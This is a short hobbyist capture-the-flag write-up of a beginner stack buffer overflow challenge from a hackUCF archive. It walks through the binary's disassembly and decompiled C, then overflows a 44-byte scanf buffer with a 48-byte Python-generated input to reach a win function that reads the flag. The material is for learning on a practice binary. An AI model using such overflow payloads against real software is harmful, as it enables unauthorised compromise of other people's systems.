Challenge from the hackUCF archive, in the pwn category.

My second BOF challenge completed ðŸ˜ƒ

Trying to learn without using ghidra, and with just assembly. ðŸ’€

Here is the main function:

```
;-- main:
0x00401246      invalid
0x00401247      invalid
0x00401248      invalid
0x00401249      cli
0x0040124a      push    rbp
0x0040124b      mov     rbp, rsp
0x0040124e      sub     rsp, 0x30
0x00401252      mov     dword [rbp - 4], 0
0x00401259      lea     rax, qword [rbp - 0x30]
0x0040125d      mov     rsi, rax
0x00401260      lea     rdi, qword [0x00402024]
0x00401267      mov     eax, 0
0x0040126c      call    __isoc99_scanf ; sym.imp.__isoc99_scanf
0x00401271      cmp     dword [rbp - 4], 0
0x00401275      je      0x40127e
0x00401277      call    win        ; sym.win
0x0040127c      jmp     0x40128a
0x0040127e      lea     rdi, qword str.nope ; 0x402027
0x00401285      call    section..plt.sec
0x0040128a      mov     eax, 0
```

Walking through it:

```
rbp - base pointer, pointers to the bottom/base of the stack frame
rsp - points to the top of the current stack frame
```

```
0x0040124e      sub     rsp, 0x30  <-- stack of size 48 bytes
```

Move 0 (4 bytes) into the address [rbp-4], (basically set `var_b = 0;`)

```
0x00401252      mov     dword [rbp - 4], 0
```

Load the effective address of [rbp-0x30] into the rax register.

```
0x00401259      lea     rax, qword [rbp - 0x30]
```

We can now visualize the stack, with var_a being the variable being at rbp-0x30, and var_b being at the rbp-4.

This next block setups the scanf() call with the var_a being passed in as var_a so the call is `scanf([0x00402024], var_a);` 

```
0x0040125d      mov     rsi, rax
0x00401260      lea     rdi, qword [0x00402024]
0x00401267      mov     eax, 0
0x0040126c      call    __isoc99_scanf ; sym.imp.__isoc99_scanf
```

We now compare var_b to 0, if var_b is equal to 0 we jump to 0x401270 which prints nope!

```
0x00401271      cmp     dword [rbp - 4], 0
0x00401275      je      0x40127e  <---- jump to the line that prints nope
```

Otherwise it calls the function win, which opens the file containing the flag.

```
0x00401277      call    win        ; sym.win
```

To exploit this we want to overflow the buffer of var_a so we can overwrite var_b to equal something besides 0.

Since var_a is of size 44, we need to write more that 44 bytes to it.

```
crazyeights@es-base:~$ python3 -c 'print("A"*48)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

I used 48 bytes, and I created a flag.txt file so it would get an error when it tried to open it.

We now have the flag!  We can see flag.txt being opened when we run the program with strace.

Here is the actual code, which is much easier to read than assembly. ðŸ˜‘

```
undefined8 main(void)

{
  undefined local_38 [44];
  int local_c;
  
  local_c = 0;
  __isoc99_scanf(&DAT_00402024,local_38);
  if (local_c == 0) {
    puts("nope!");
  }
  else {
    win();
  }
  return 0;
}
```

I am terrible at explaining things, I hope that was okay.

FIN. ðŸ¥³
